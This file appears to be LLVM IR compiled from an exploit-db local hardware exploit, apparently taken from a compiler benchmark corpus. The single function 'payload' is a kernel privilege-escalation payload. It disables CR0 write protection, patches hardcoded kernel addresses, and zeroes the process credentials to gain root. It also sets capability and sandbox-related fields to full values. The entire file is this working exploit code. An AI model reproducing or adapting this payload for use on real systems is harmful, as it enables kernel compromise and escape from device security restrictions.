; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hardware/local/extr_44206.c_payload.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hardware/local/extr_44206.c_payload.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.knote = type { i32 }
%struct.thread = type { %struct.TYPE_2__* }
%struct.TYPE_2__ = type { %struct.ucred* }
%struct.ucred = type { i8*, i64*, i64, i64, i64 }

@.str = private unnamed_addr constant [40 x i8] c"\0A\0A\0A\0A\0A\0A\0A\0A\0AHello from kernel :-)\0A\0A\0A\0A\0A\0A\0A\0A\0A\00", align 1
@X86_CR0_WP = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @payload(%struct.knote* %0) #0 {
  %2 = alloca %struct.knote*, align 8
  %3 = alloca %struct.thread*, align 8
  %4 = alloca %struct.ucred*, align 8
  %5 = alloca i32*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32*, align 8
  %9 = alloca i32*, align 8
  %10 = alloca i32*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32*, align 8
  %13 = alloca i32*, align 8
  %14 = alloca i32*, align 8
  store %struct.knote* %0, %struct.knote** %2, align 8
  %15 = call %struct.thread* asm sideeffect "mov $0, %gs:0", "=r,~{dirflag},~{fpsr},~{flags}"() #2, !srcloc !2
  store %struct.thread* %15, %struct.thread** %3, align 8
  store i32* inttoptr (i64 -2093858058 to i32*), i32** %5, align 8
  %16 = load i32*, i32** %5, align 8
  %17 = load i32, i32* %16, align 4
  %18 = and i32 %17, -32769
  %19 = load i32*, i32** %5, align 8
  store i32 %18, i32* %19, align 4
  %20 = call i32 @printfkernel(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str, i64 0, i64 0))
  %21 = call i32 (...) @readCr0()
  store i32 %21, i32* %6, align 4
  %22 = load i32, i32* %6, align 4
  %23 = load i32, i32* @X86_CR0_WP, align 4
  %24 = xor i32 %23, -1
  %25 = and i32 %22, %24
  %26 = call i32 @writeCr0(i32 %25)
  store i32 37008, i32* inttoptr (i64 -2107605946 to i32*), align 4
  store i32 37008, i32* inttoptr (i64 -2107607002 to i32*), align 4
  store i8 1, i8* inttoptr (i64 -2093858022 to i8*), align 1
  store i8 1, i8* inttoptr (i64 -2093857992 to i8*), align 1
  %27 = load i32, i32* %6, align 4
  %28 = call i32 @writeCr0(i32 %27)
  %29 = load %struct.thread*, %struct.thread** %3, align 8
  %30 = getelementptr inbounds %struct.thread, %struct.thread* %29, i32 0, i32 0
  %31 = load %struct.TYPE_2__*, %struct.TYPE_2__** %30, align 8
  %32 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %31, i32 0, i32 0
  %33 = load %struct.ucred*, %struct.ucred** %32, align 8
  store %struct.ucred* %33, %struct.ucred** %4, align 8
  %34 = load %struct.ucred*, %struct.ucred** %4, align 8
  %35 = getelementptr inbounds %struct.ucred, %struct.ucred* %34, i32 0, i32 4
  store i64 0, i64* %35, align 8
  %36 = load %struct.ucred*, %struct.ucred** %4, align 8
  %37 = getelementptr inbounds %struct.ucred, %struct.ucred* %36, i32 0, i32 3
  store i64 0, i64* %37, align 8
  %38 = load %struct.ucred*, %struct.ucred** %4, align 8
  %39 = getelementptr inbounds %struct.ucred, %struct.ucred* %38, i32 0, i32 2
  store i64 0, i64* %39, align 8
  %40 = load %struct.ucred*, %struct.ucred** %4, align 8
  %41 = getelementptr inbounds %struct.ucred, %struct.ucred* %40, i32 0, i32 1
  %42 = load i64*, i64** %41, align 8
  %43 = getelementptr inbounds i64, i64* %42, i64 0
  store i64 0, i64* %43, align 8
  %44 = load %struct.thread*, %struct.thread** %3, align 8
  %45 = bitcast %struct.thread* %44 to i8*
  %46 = getelementptr inbounds i8, i8* %45, i64 304
  %47 = bitcast i8* %46 to i8**
  %48 = load i8*, i8** %47, align 8
  store i8* %48, i8** %7, align 8
  %49 = load i8*, i8** %7, align 8
  %50 = getelementptr inbounds i8, i8* %49, i64 96
  %51 = bitcast i8* %50 to i32*
  store i32* %51, i32** %8, align 8
  %52 = load i32*, i32** %8, align 8
  store i32 -1, i32* %52, align 4
  %53 = load i8*, i8** %7, align 8
  %54 = getelementptr inbounds i8, i8* %53, i64 88
  %55 = bitcast i8* %54 to i32*
  store i32* %55, i32** %9, align 8
  %56 = load i32*, i32** %9, align 8
  store i32 19, i32* %56, align 4
  %57 = load i8*, i8** %7, align 8
  %58 = getelementptr inbounds i8, i8* %57, i64 104
  %59 = bitcast i8* %58 to i32*
  store i32* %59, i32** %10, align 8
  %60 = load i32*, i32** %10, align 8
  store i32 -1, i32* %60, align 4
  store i32 1193046, i32* inttoptr (i64 -2094218520 to i32*), align 4
  store i32 0, i32* inttoptr (i64 -2094802408 to i32*), align 4
  %61 = load %struct.ucred*, %struct.ucred** %4, align 8
  %62 = getelementptr inbounds %struct.ucred, %struct.ucred* %61, i32 0, i32 0
  store i8* inttoptr (i64 -2094828976 to i8*), i8** %62, align 8
  %63 = load %struct.thread*, %struct.thread** %3, align 8
  %64 = getelementptr inbounds %struct.thread, %struct.thread* %63, i32 0, i32 0
  %65 = load %struct.TYPE_2__*, %struct.TYPE_2__** %64, align 8
  %66 = bitcast %struct.TYPE_2__* %65 to i8*
  %67 = getelementptr inbounds i8, i8* %66, i64 72
  %68 = bitcast i8* %67 to i8**
  %69 = load i8*, i8** %68, align 8
  store i8* %69, i8** %11, align 8
  %70 = load i8*, i8** %11, align 8
  %71 = getelementptr inbounds i8, i8* %70, i64 24
  %72 = bitcast i8* %71 to i32*
  store i32* %72, i32** %12, align 8
  %73 = load i8*, i8** %11, align 8
  %74 = getelementptr inbounds i8, i8* %73, i64 32
  %75 = bitcast i8* %74 to i32*
  store i32* %75, i32** %13, align 8
  store i32* inttoptr (i64 -2094073568 to i32*), i32** %14, align 8
  %76 = load i32*, i32** %14, align 8
  %77 = load i32, i32* %76, align 4
  %78 = load i32*, i32** %12, align 8
  store i32 %77, i32* %78, align 4
  %79 = load i32*, i32** %14, align 8
  %80 = load i32, i32* %79, align 4
  %81 = load i32*, i32** %13, align 8
  store i32 %80, i32* %81, align 4
  ret void
}

declare dso_local i32 @printfkernel(i8*) #1

declare dso_local i32 @readCr0(...) #1

declare dso_local i32 @writeCr0(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{i32 627}
